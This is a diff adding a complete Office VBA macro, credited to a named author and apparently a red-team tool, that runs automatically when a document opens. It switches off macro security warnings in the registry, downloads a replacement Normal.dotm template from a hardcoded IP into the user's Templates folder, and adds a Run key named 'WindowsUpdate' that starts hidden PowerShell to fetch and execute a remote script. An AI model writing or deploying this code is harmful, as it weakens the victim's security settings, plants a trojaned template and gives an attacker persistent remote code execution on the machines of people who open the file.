@@ -1,0 +1,60 @@
+'Written By Matt Nelson @enigma0x3
+
+Sub Auto_Open()
+
+DisableMacroSecurity
+Drop
+Persist
+
+End Sub
+
+
+Public Function DisableMacroSecurity() As Variant
+Dim WshShell As Object
+Set WshShell = CreateObject("WScript.Shell")
+On Error Resume Next
+  WshShell.RegWrite "HKCU\Software\Microsoft\Office\14.0\Word\Security\VBAWarnings", "1", "REG_DWORD"
+  WshShell.RegWrite "HKCU\Software\Microsoft\Office\14.0\Excel\Security\VBAWarnings", "1", "REG_DWORD"
+Set WshShell = Nothing
+
+
+End Function
+
+Public Function Drop() As Variant
+
+    Dim FileNum As Long
+    Dim FileData() As Byte
+    Dim MyFile As String
+    Dim WHTTP As Object
+    Dim Path As String
+
+    On Error Resume Next
+    Set WHTTP = CreateObject("WinHTTP.WinHTTPrequest.5")
+    If Err.Number <> 0 Then
+        Set WHTTP = CreateObject("WinHTTP.WinHTTPrequest.5.1")
+    End If
+    On Error GoTo 0
+    
+    MyFile = "http://192.168.1.128/Normal.dotm"
+    
+    WHTTP.Open "GET", MyFile, False
+    WHTTP.Send
+    FileData = WHTTP.ResponseBody
+    Set WHTTP = Nothing
+    Path = Environ("USERPROFILE") + "\AppData\Roaming\Microsoft\Templates"
+    FileNum = FreeFile
+    Open Path + "\Normal.dotm" For Binary Access Write As #FileNum
+    Put #FileNum, 1, FileData
+    Close #FileNum
+            
+    End Function
+    
+    Public Function Persist()
+    
+     Const HIDDEN_WINDOW = 0
+        Dim WShell As Object
+        Set WShell = CreateObject("WScript.Shell")
+        WShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", "C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -NonInteractive -WindowStyle Hidden -noprofile -noexit -Command IEX ((New-Object Net.WebClient).DownloadString('http://192.168.1.127/persist.ps1'))", "REG_SZ"
+        Set WShell = Nothing
+    
+    End Function
